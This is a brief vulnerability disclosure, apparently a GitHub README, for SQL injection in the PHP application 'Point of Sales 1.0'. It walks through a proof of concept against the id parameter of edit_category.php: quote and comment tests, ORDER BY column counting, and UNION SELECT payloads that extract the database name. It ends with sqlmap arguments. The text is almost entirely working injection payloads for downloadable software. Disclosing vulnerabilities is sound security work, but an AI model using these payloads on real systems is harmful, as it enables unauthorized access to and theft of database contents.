# Point of Sales 1.0 - SQL Injection  
* Vendor Homepage: https://www.sourcecodester.com/php/14540/point-sales-phppdo-full-source-code-2020.html   
* Software Link: https://www.sourcecodester.com/sites/default/files/download/janobe/pos_0.zip  
* Version: V1.0  
* Proof of Concept:  
1. http://192.168.100.234/pos/edit_category.php?id=1    
![image](https://github.com/BigTiger2020/Point-of-Sales/blob/main/02.png)  
2. http://192.168.100.234/pos/edit_category.php?id=1'  
![image](https://github.com/BigTiger2020/Point-of-Sales/blob/main/03.png)    
3. http://192.168.100.234/pos/edit_category.php?id=1' --+  
![image](https://github.com/BigTiger2020/Point-of-Sales/blob/main/04.png)   
4. http://192.168.100.234/pos/edit_category.php?id=1' order by 1,2--+   
![image](https://github.com/BigTiger2020/Point-of-Sales/blob/main/05.png)  
5. http://192.168.100.234/pos/edit_category.php?id=-1%27%20UNION%20Select%201,2--+  
![image](https://github.com/BigTiger2020/Point-of-Sales/blob/main/06.png)   
6. http://192.168.100.234/pos/edit_category.php?id=-1%27%20UNION%20Select%201,database()--+  
![image](https://github.com/BigTiger2020/Point-of-Sales/blob/main/08.png)   
* sql payload:    
-u http://192.168.100.234/pos/edit_category.php?id=1  --batch --current-db  
![image](https://github.com/BigTiger2020/Point-of-Sales/blob/main/09.png)  
